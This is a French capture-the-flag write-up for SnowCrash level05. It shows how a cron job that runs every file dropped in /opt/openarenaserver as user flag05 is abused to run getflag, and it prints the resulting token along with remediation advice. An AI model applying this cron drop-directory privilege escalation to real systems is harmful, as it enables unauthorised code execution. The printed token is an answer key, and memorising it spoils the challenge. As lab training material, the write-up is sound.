# SnowCrash - level05 writeup

## Objectif

Trouver un mécanisme d’exécution automatique en contexte flag05, y déposer un script qui lance getflag, puis récupérer le token.

## Recon

Recherche des fichiers liés à level05 :

```
ls -R / 2>/dev/null | grep level05
find / -name level05 2>/dev/null
find / -name level05.conf 2>/dev/null
```

Découverte d’un mail système contenant une tâche cron :

```
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Analyse du script exécuté par cron :

```
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
(ulimit -t 5; bash -x "$i")
rm -f "$i"
done
```

## Analyse

Toutes les 2 minutes, flag05 exécute /usr/sbin/openarenaserver via su.
Ce script :

- exécute tous les fichiers dans /opt/openarenaserver/ avec bash -x
- supprime ensuite chaque fichier exécuté

Donc il suffit de déposer un fichier dans /opt/openarenaserver/ qui exécute getflag, et d’attendre le passage du cron.

## Exploitation

Création d’un script dans /opt/openarenaserver/ qui redirige la sortie de getflag vers un fichier lisible :

```
echo "getflag > /opt/openarenaserver/b" > /opt/openarenaserver/getflag
```

Après exécution par le cron, lecture du fichier de sortie :

```
cat /opt/openarenaserver/b
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Résultat

- Technique - > Exécution via cron + dossier “drop” /opt/openarenaserver/
- Token getflag - > viuaaale9huek52boumoomioc

## Notes

- Point important : le script supprime le payload après exécution, donc écrire la preuve/token dans un autre fichier (ou utiliser wall comme preuve visible)
- Correction : permissions strictes sur /opt/openarenaserver/, valider/whitelister les scripts, éviter d’exécuter des fichiers déposables par des utilisateurs non privilégiés
